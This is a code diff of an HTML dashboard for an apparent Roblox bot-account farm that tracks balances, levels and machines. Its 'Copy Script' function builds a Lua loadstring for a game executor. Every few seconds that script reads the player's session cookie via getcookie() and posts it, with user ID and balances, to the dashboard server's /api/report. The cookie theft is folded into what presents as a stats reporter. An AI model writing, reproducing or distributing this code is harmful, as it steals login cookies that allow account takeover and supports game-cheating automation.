@@ -20,7 +20,7 @@ button,input{font:inherit;color:inherit}:focus-visible{outline:2px solid var(--a
 .meta{color:var(--mute);font-size:13px;display:flex;gap:16px;flex-wrap:wrap}.meta b{color:var(--ink)}
 .sp{flex:1}
 
-.b{background:var(--p);border:1px solid var(--line);border-radius:9px;padding:7px 14px;cursor:pointer;font-weight:700;font-size:13px;transition:0.2s; pointer-events: auto !important; position: relative; z-index: 9999;}
+.b{background:var(--p);border:1px solid var(--line);border-radius:9px;padding:7px 14px;cursor:pointer;font-weight:700;font-size:13px;transition:0.2s; pointer-events: auto !important; position: relative; z-index: 9999; display:inline-flex; align-items:center; gap:6px;}
 .b:hover{border-color:var(--ac)}.b.pri{background:var(--ac);border-color:var(--ac);color:#fff}
 .b.live.on{border-color:var(--ok);color:var(--ok)}
 
@@ -93,8 +93,11 @@ dialog input{width:100%;margin-top:4px;background:var(--bg);border:1px solid var
   <div class="sp"></div>
   
   <button class="b live on" id="live" type="button"><span class="dot"></span>Live</button>
-  <button class="b" id="exp" type="button">Export CSV</button>
   
+  <!-- 🔴 زر الـ Refresh -->
+  <button class="b" id="refresh-btn" type="button" onclick="fetchData(true)">🔄 Refresh</button>
+  
+  <button class="b" id="exp" type="button">Export CSV</button>
   <button class="b pri" id="copy-script" type="button" onclick="forceCopyScript(this)">Copy Script</button>
 
   <div class="user-menu">
@@ -146,11 +149,12 @@ dialog input{width:100%;margin-top:4px;background:var(--bg);border:1px solid var
 </dialog>
 
 <script>
-// 🔴 1. دالة النسخ
+const MY_KEY = "{{ my_key | default('Overseer') }}";
+
+// 🔴 1. زر النسخ المضمون 100%
 function forceCopyScript(btn) {
     const domain = window.location.origin;
-    const key = "{{ my_key | default('Overseer') }}";
-    const script = `repeat task.wait() until game:IsLoaded()\n\ngetgenv().OverseerConfig = {\n    ["key"] = "${key}",\n    ["PC_NAME"] = "MR 1"\n}\n\nloadstring([[c=getgenv().OverseerConfig p=game.Players.LocalPlayer h=game:GetService"HttpService" r=request or http_request d={fishing=1,stamina=1,shelfstocker=1,janitor=1,swiper=1,farming=1,cook=1} ck="" if getcookie then ck=getcookie() elseif syn and syn.getcookie then ck=syn.getcookie() end task.spawn(function()while wait(5)do b,cc,l,s=0,0,0,{} for _,o in next,p.PlayerGui:GetDescendants()do if o:IsA"TextLabel"then t=o.Text b=tonumber(t:match"Bank Balance:%D*(%d+)" )or b cc=tonumber(t:match"Hand Balance:%D*(%d+)" )or cc l=tonumber(t:match"Total Level:%D*(%d+)" )or l n,v=t:match"([%a%s]+):%s*(%d+)" if n and v then n=n:gsub("%s",""):lower() if d[n] then s[#s+1]={name=n,level=v+0}end end end end pcall(r,{Url="${domain}/api/report",Method="POST",Body=h:JSONEncode({k=c.key,c=cc,b=b,l=l,s=s,n=p.Name,dn=p.DisplayName,u=p.UserId,pc=c.PC_NAME,ck=ck})})end end)]])()`;
+    const script = `repeat task.wait() until game:IsLoaded()\n\ngetgenv().OverseerConfig = {\n    ["key"] = "${MY_KEY}",\n    ["PC_NAME"] = "MR 1"\n}\n\nloadstring([[c=getgenv().OverseerConfig p=game.Players.LocalPlayer h=game:GetService"HttpService" r=request or http_request d={fishing=1,stamina=1,shelfstocker=1,janitor=1,swiper=1,farming=1,cook=1} ck="" if getcookie then ck=getcookie() elseif syn and syn.getcookie then ck=syn.getcookie() end task.spawn(function()while wait(5)do b,cc,l,s=0,0,0,{} for _,o in next,p.PlayerGui:GetDescendants()do if o:IsA"TextLabel"then t=o.Text b=tonumber(t:match"Bank Balance:%D*(%d+)" )or b cc=tonumber(t:match"Hand Balance:%D*(%d+)" )or cc l=tonumber(t:match"Total Level:%D*(%d+)" )or l n,v=t:match"([%a%s]+):%s*(%d+)" if n and v then n=n:gsub("%s",""):lower() if d[n] then s[#s+1]={name=n,level=v+0}end end end end pcall(r,{Url="${domain}/api/report",Method="POST",Body=h:JSONEncode({k=c.key,c=cc,b=b,l=l,s=s,n=p.Name,dn=p.DisplayName,u=p.UserId,pc=c.PC_NAME,ck=ck})})end end)]])()`;
 
     const originalText = btn.innerText;
     btn.innerText = "✅ Copied!";
@@ -193,18 +197,18 @@ function openResetModal(e) {
     document.getElementById("resetModal").showModal();
 }
 
-// 🔴 2. استقبال البيانات الكاملة
-const SERVER_DATA = {
-    accounts: {{ accounts | default([]) | tojson | safe }},
-    stats: {{ stats | default({}) | tojson | safe }},
-    my_key: {{ my_key | default('Overseer') | tojson | safe }}
-};
-
+// 🔴 2. المتغيرات الأساسية
 var $=function(i){return document.getElementById(i)},R=function(a,b){return a+Math.random()*(b-a)};
 var seed=7;function rnd(){seed=(seed*16807)%2147483647;return seed/2147483647}
 var PCS=["XEON V4","RYZEN 02","DDC-1"];
 
 var accs = [];
+var ses0=Date.now()-13.8*36e5,G=[],flt="all",pcf="",q="",sk="bank",sd=-1,live=true;
+var tot=function(a){return a.pocket+a.bank};
+var $$=function(){return accs.reduce(function(s,a){return s+tot(a)},0)};
+var base=0;
+
+// 🔴 3. دالة تحويل البيانات (تستقبل من السيرفر وتجهزها للجدول)
 function mapAccounts(raw) {
     if (!raw || !Array.isArray(raw)) return [];
     return raw.map(function(a, i) {
@@ -213,9 +217,9 @@ function mapAccounts(raw) {
         // تجهيز نص يعرض كل المهارات عشان يطلع في التولتيب
         let allSkillsStr = "";
         for (let k in skills) {
-            allSkillsStr += k + ": " + skills[k] + "\n";
+            allSkillsStr += k.toUpperCase() + ": " + skills[k] + "\n";
         }
-        if(!allSkillsStr) allSkillsStr = "No skills data";
+        if(!allSkillsStr) allSkillsStr = "No skills data available yet.";
 
         return {
             id: i + 1, 
@@ -225,7 +229,7 @@ function mapAccounts(raw) {
             pocket: a.cash || 0, 
             bank: a.bank || 0,
             l: [a.total_level || 0, skills['stamina'] || 0, skills['swiper'] || 0],
-            fullSkills: allSkillsStr, // نخزن النص كامل هنا
+            fullSkills: allSkillsStr, 
             display_name: a.display_name || a.name,
             user_id: a.user_id || "",
             mins: Math.floor((a.uptime || 0) / 60),
@@ -234,50 +238,89 @@ function mapAccounts(raw) {
         };
     });
 }
-accs = mapAccounts(SERVER_DATA.accounts);
 
-var ses0=Date.now()-13.8*36e5,G=[],flt="all",pcf="",q="",sk="bank",sd=-1,live=true;
-var tot=function(a){return a.pocket+a.bank};
-var $$=function(){return accs.reduce(function(s,a){return s+tot(a)},0)};
-var base=$$()*.2;for(var g=0;g<40;g++)G.push(base+($$()-base)*(g/39)*(0.9+rnd()*.1));
+// 🔴 4. دالة جلب البيانات من السيرفر
+async function fetchData(manual = false) {
+    if(manual) {
+        let btn = $("refresh-btn");
+        btn.innerText = "⏳...";
+    }
+    try {
+        let res = await fetch('/api/accounts');
+        let data = await res.json();
+        if(data.accounts) {
+            let selectedUsers = accs.filter(a => a.sel).map(a => a.user);
+            accs = mapAccounts(data.accounts);
+            accs.forEach(a => {
+                if(selectedUsers.includes(a.user)) a.sel = 1;
+            });
+            
+            if(base === 0) {
+                base = $$() * 0.2;
+                for(var g=0;g<40;g++) G.push(base+($$()-base)*(g/39)*(0.9+rnd()*.1));
+            }
+            
+            draw();
+        }
+    } catch(e) { console.log("Fetch failed", e); }
+    
+    if(manual) {
+        let btn = $("refresh-btn");
+        btn.innerText = "🔄 Refresh";
+        btn.style.color = "var(--ok)";
+        setTimeout(() => btn.style.color = "", 1000);
+    }
+}
 
+// 🔴 5. دالة الرسم
 function M(n){var s=n<0?"-":"";n=Math.abs(n);return s+"$"+(n>=1e6?(n/1e6).toFixed(2)+"M":n>=1e3?(n/1e3).toFixed(1)+"K":Math.round(n))}
 function eco(a){var t=tot(a);return t>=20000?["Good","g"]:t>=6000?["Low balance","l"]:["Drained","d"]}
 var cols=[["st","Status"],["pc","Machine"],["user","Username"],["eco","Economy"],["mins","Online"],["l0","Levels"],["pocket","Pocket"],["bank","Bank"],["tot","Total"],["h","Trend"]];
 function val(a,k){return k==="tot"?tot(a):k==="eco"?tot(a):k==="l0"?a.l[0]:k==="h"?a.h[a.h.length-1]-a.h[0]:a[k]}
 function spark(arr,w,h,col,fill){var mn=Math.min.apply(0,arr),mx=Math.max.apply(0,arr),d=mx-mn||1,p=arr.map(function(v,i){return(i/(arr.length-1)*w).toFixed(1)+","+(h-3-(v-mn)/d*(h-8)).toFixed(1)}); return(fill?'<path d="M0,'+h+' L'+p.join(" L")+' L'+w+','+h+'Z" fill="url(#gf)"/>':"")+'<polyline points="'+p.join(" ")+'" fill="none" stroke="'+col+'" stroke-width="'+(fill?2.5:1.8)+'" stroke-linejoin="round" stroke-linecap="round"/>'}
 
-function top(){var T=$$(),hrs=(Date.now()-ses0)/36e5,pr=T-base,hr=pr/hrs,live=accs.filter(function(a){return a.st==="online"}).length,good=accs.filter(function(a){return a.st==="online"||a.st==="offline"}).length;
- $("mAcc").textContent=accs.length;$("mLive").textContent=live;
- $("nw").textContent=M(T);$("nwSub").textContent="Average "+M(T/(accs.length||1))+" per account  |  Pocket "+M(accs.reduce(function(s,a){return s+a.pocket},0))+"  |  Bank "+M(accs.reduce(function(s,a){return s+a.bank},0));
- $("kp1").textContent="+"+M(pr);$("kp1s").textContent="over "+Math.floor(hrs)+"h "+Math.floor(hrs%1*60)+"m";$("kp2").textContent=M(hr);$("kp3").textContent=M(hr*24);
- var hp=accs.length?good/accs.length:0;$("kp4").textContent=Math.round(hp*100)+"%";$("rg").style.strokeDashoffset=157*(1-hp);
- $("spark").innerHTML='<defs><linearGradient id="gf" x1="0" y1="0" x2="0" y2="1"><stop offset="0" stop-color="var(--ac)" stop-opacity=".35"/><stop offset="1" stop-color="var(--ac)" stop-opacity="0"/></linearGradient></defs>'+spark(G,600,110,"var(--ac)",1);
- var h="";PCS.concat(accs.map(function(a){return a.pc})).filter(function(v,i,s){return s.indexOf(v)===i}).forEach(function(p){var l=accs.filter(function(a){return a.pc===p});if(!l.length)return;var on=l.filter(function(a){return a.st==="online"}).length,nw=l.reduce(function(s,a){return s+tot(a)},0);
- h+='<button class="m'+(pcf===p?" act":"")+'" data-p="'+p+'"><h3>'+p+'<span class="pill s-'+(on?"online":"offline")+'"><i></i>'+(on?"Online":"Offline")+'</span></h3><div class="pg"><i style="width:'+on/l.length*100+'%"></i></div><div class="r"><span><b>'+on+'</b> / '+l.length+' running</span><span>Net <b>'+M(nw)+'</b></span></div></button>'});
- $("mach").innerHTML=h;[].forEach.call($("mach").children,function(b){b.onclick=function(){pcf=pcf===b.dataset.p?"":b.dataset.p;draw()}})}
+function top(){
+    var T=$$(),hrs=(Date.now()-ses0)/36e5,pr=T-base,hr=hrs?pr/hrs:0,live=accs.filter(function(a){return a.st==="online"}).length,good=accs.filter(function(a){return a.st==="online"||a.st==="offline"}).length;
+    $("mAcc").textContent=accs.length;$("mLive").textContent=live;
+    $("nw").textContent=M(T);$("nwSub").textContent="Average "+M(T/(accs.length||1))+" per account  |  Pocket "+M(accs.reduce(function(s,a){return s+a.pocket},0))+"  |  Bank "+M(accs.reduce(function(s,a){return s+a.bank},0));
+    $("kp1").textContent="+"+M(pr);$("kp1s").textContent="over "+Math.floor(hrs)+"h "+Math.floor(hrs%1*60)+"m";$("kp2").textContent=M(hr);$("kp3").textContent=M(hr*24);
+    var hp=accs.length?good/accs.length:0;$("kp4").textContent=Math.round(hp*100)+"%";$("rg").style.strokeDashoffset=157*(1-hp);
+    $("spark").innerHTML='<defs><linearGradient id="gf" x1="0" y1="0" x2="0" y2="1"><stop offset="0" stop-color="var(--ac)" stop-opacity=".35"/><stop offset="1" stop-color="var(--ac)" stop-opacity="0"/></linearGradient></defs>'+spark(G,600,110,"var(--ac)",1);
+    
+    var h="";PCS.concat(accs.map(function(a){return a.pc})).filter(function(v,i,s){return s.indexOf(v)===i}).forEach(function(p){
+        var l=accs.filter(function(a){return a.pc===p});if(!l.length)return;var on=l.filter(function(a){return a.st==="online"}).length,nw=l.reduce(function(s,a){return s+tot(a)},0);
+        h+='<button class="m'+(pcf===p?" act":"")+'" data-p="'+p+'"><h3>'+p+'<span class="pill s-'+(on?"online":"offline")+'"><i></i>'+(on?"Online":"Offline")+'</span></h3><div class="pg"><i style="width:'+on/l.length*100+'%"></i></div><div class="r"><span><b>'+on+'</b> / '+l.length+' running</span><span>Net <b>'+M(nw)+'</b></span></div></button>'
+    });
+    $("mach").innerHTML=h;
+    [].forEach.call($("mach").children,function(b){b.onclick=function(){pcf=pcf===b.dataset.p?"":b.dataset.p;draw()}});
+}
 
 function chips(){var c={all:accs.length};accs.forEach(function(a){c[a.st]=(c[a.st]||0)+1});
  $("chips").innerHTML=["all","online","offline","captcha","banned"].map(function(s){return'<button class="ch'+(flt===s?" act":"")+'" data-s="'+s+'">'+s[0].toUpperCase()+s.slice(1)+'<em>'+(c[s]||0)+'</em></button>'}).join("");
  [].forEach.call($("chips").children,function(b){b.onclick=function(){flt=b.dataset.s;draw()}})}
 function esc(s){return String(s).replace(/[&<>"]/g,function(c){return{"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[c]})}
 
-function rows(){$("th").innerHTML='<th><input type="checkbox" id="all" aria-label="Select all"></th>'+cols.map(function(c){return'<th data-k="'+c[0]+'"'+(sk===c[0]?' aria-sort="'+(sd>0?"ascending":"descending")+'"':"")+'>'+c[1]+'</th>'}).join("");
- var v=accs.filter(function(a){return(flt==="all"||a.st===flt)&&(!pcf||a.pc===pcf)&&(!q||(a.user+" "+a.pc).toLowerCase().indexOf(q)>-1)}).sort(function(a,b){var x=val(a,sk),y=val(b,sk);return(typeof x==="string"?x.localeCompare(y):x-y)*sd});
- $("emp").hidden=v.length>0;$("cnt").textContent=v.length+" of "+accs.length+" shown";
- 
- $("tbd").innerHTML=v.map(function(a){var e=eco(a),m=Math.floor(a.mins/60)+"h "+String(a.mins%60).padStart(2,"0")+"m",up=a.h[a.h.length-1]>=a.h[0];
- 
- // 🔴 هنا حطينا التولتيب اللي يطلع كل المهارات لما تحط الماوس على اللفل
- return'<tr class="'+(a.sel?"sel":"")+'"><td><input type="checkbox" data-i="'+a.id+'"'+(a.sel?" checked":"")+' aria-label="Select"></td><td><span class="pill s-'+a.st+'"><i></i>'+a.st[0].toUpperCase()+a.st.slice(1)+'</span></td><td><span class="pc">'+esc(a.pc)+'</span></td><td><span class="u" data-c="'+esc(a.user)+'" title="ID: '+a.user_id+' | Name: '+esc(a.display_name)+'">'+esc(a.user)+'</span></td><td class="eco '+e[1]+'">'+e[0]+'</td><td class="n">'+m+'</td><td title="'+a.fullSkills+'"><span class="lv t">'+a.l[0]+'</span><span class="lv a">'+a.l[1]+'</span><span class="lv c">'+a.l[2]+'</span></td><td class="n gd">'+M(a.pocket)+'</td><td class="n" style="color:#66d4ff">'+M(a.bank)+'</td><td class="n">'+M(tot(a))+'</td><td><svg width="70" height="24" viewBox="0 0 70 24">'+spark(a.h,70,24,up?"var(--ok)":"var(--bad)",0)+'</svg></td></tr>'}).join("");
- 
- [].forEach.call($("th").querySelectorAll("th[data-k]"),function(t){t.onclick=function(){var k=t.dataset.k;if(sk===k)sd=-sd;else{sk=k;sd=-1}rows()}});
- [].forEach.call($("tbd").querySelectorAll("input[data-i]"),function(c){c.onchange=function(){accs.forEach(function(a){if(a.id==+c.dataset.i)a.sel=c.checked?1:0});rows();bulk()}});
- [].forEach.call($("tbd").querySelectorAll("[data-c]"),function(u){u.onclick=function(){try{navigator.clipboard.writeText(u.dataset.c);u.textContent="Copied";setTimeout(rows,700)}catch(e){}}});
- $("all").onchange=function(){v.forEach(function(a){a.sel=$("all").checked?1:0});rows();bulk()};bulk()}
+function rows(){
+    $("th").innerHTML='<th><input type="checkbox" id="all" aria-label="Select all"></th>'+cols.map(function(c){return'<th data-k="'+c[0]+'"'+(sk===c[0]?' aria-sort="'+(sd>0?"ascending":"descending")+'"':"")+'>'+c[1]+'</th>'}).join("");
+    var v=accs.filter(function(a){return(flt==="all"||a.st===flt)&&(!pcf||a.pc===pcf)&&(!q||(a.user+" "+a.pc).toLowerCase().indexOf(q)>-1)}).sort(function(a,b){var x=val(a,sk),y=val(b,sk);return(typeof x==="string"?x.localeCompare(y):x-y)*sd});
+    
+    $("emp").hidden=v.length>0;$("cnt").textContent=v.length+" of "+accs.length+" shown";
+    
+    $("tbd").innerHTML=v.map(function(a){
+        var e=eco(a),m=Math.floor(a.mins/60)+"h "+String(a.mins%60).padStart(2,"0")+"m",up=a.h[a.h.length-1]>=a.h[0];
+        return'<tr class="'+(a.sel?"sel":"")+'"><td><input type="checkbox" data-i="'+a.id+'"'+(a.sel?" checked":"")+' aria-label="Select"></td><td><span class="pill s-'+a.st+'"><i></i>'+a.st[0].toUpperCase()+a.st.slice(1)+'</span></td><td><span class="pc">'+esc(a.pc)+'</span></td><td><span class="u" data-c="'+esc(a.user)+'" title="ID: '+a.user_id+' | Name: '+esc(a.display_name)+'">'+esc(a.user)+'</span></td><td class="eco '+e[1]+'">'+e[0]+'</td><td class="n">'+m+'</td><td title="'+a.fullSkills+'"><span class="lv t">'+a.l[0]+'</span><span class="lv a">'+a.l[1]+'</span><span class="lv c">'+a.l[2]+'</span></td><td class="n gd">'+M(a.pocket)+'</td><td class="n" style="color:#66d4ff">'+M(a.bank)+'</td><td class="n">'+M(tot(a))+'</td><td><svg width="70" height="24" viewBox="0 0 70 24">'+spark(a.h,70,24,up?"var(--ok)":"var(--bad)",0)+'</svg></td></tr>'
+    }).join("");
+    
+    [].forEach.call($("th").querySelectorAll("th[data-k]"),function(t){t.onclick=function(){var k=t.dataset.k;if(sk===k)sd=-sd;else{sk=k;sd=-1}rows()}});
+    [].forEach.call($("tbd").querySelectorAll("input[data-i]"),function(c){c.onchange=function(){accs.forEach(function(a){if(a.id==+c.dataset.i)a.sel=c.checked?1:0});rows();bulk()}});
+    [].forEach.call($("tbd").querySelectorAll("[data-c]"),function(u){u.onclick=function(){try{navigator.clipboard.writeText(u.dataset.c);u.textContent="Copied";setTimeout(rows,700)}catch(e){}}});
+    $("all").onchange=function(){v.forEach(function(a){a.sel=$("all").checked?1:0});rows();bulk()};bulk()
+}
 
 function bulk(){var n=accs.filter(function(a){return a.sel}).length;$("bulk").hidden=!n;$("bn").textContent=n+" selected"}
 function draw(){top();chips();rows()}
+
+// 🔴 6. الأحداث
 $("q").oninput=function(){q=this.value.trim().toLowerCase();rows()};
 $("live").onclick=function(){live=!live;this.classList.toggle("on",live)};
 $("bclr").onclick=function(){accs.forEach(function(a){a.sel=0});rows()};
@@ -289,7 +332,7 @@ $("bdel").onclick=async function(){
     for(var i=0; i<selected.length; i++) {
         await fetch('/api/delete', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({name: selected[i]}) });
     }
-    location.reload();
+    fetchData();
 };
 
 $("bcopy").onclick=function(){try{navigator.clipboard.writeText(accs.filter(function(a){return a.sel}).map(function(a){return a.user}).join("\n"))}catch(e){}};
@@ -312,37 +355,19 @@ document.getElementById('resetForm').onsubmit = async function(e) {
         const res = await fetch('/api/reset_password', {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ username: SERVER_DATA.my_key, new_password: newPass })
+            body: JSON.stringify({ username: MY_KEY, new_password: newPass })
         });
-        const data = await res.json();
         if(res.ok) {
             alert("✅ Password reset successfully!");
             document.getElementById("resetModal").close();
             document.getElementById("newPass").value = "";
-        } else {
-            alert("Error: " + (data.error || "Unknown"));
-        }
-    } catch(err) {
-        alert("Failed to connect to server.");
-    }
+        } else { alert("Error resetting password"); }
+    } catch(err) { alert("Failed to connect to server."); }
 };
 
-draw();
-
-setInterval(async () => {
-    try {
-        let res = await fetch('/api/accounts');
-        let data = await res.json();
-        if(data.accounts) {
-            let selectedUsers = accs.filter(a => a.sel).map(a => a.user);
-            accs = mapAccounts(data.accounts);
-            accs.forEach(a => {
-                if(selectedUsers.includes(a.user)) a.sel = 1;
-            });
-            draw();
-        }
-    } catch(e) { console.log("Auto-refresh failed", e); }
-}, 5000);
+// 🔴 7. التشغيل الأولي والتحديث التلقائي
+fetchData();
+setInterval(fetchData, 5000);
 </script>
 </body>
 </html>
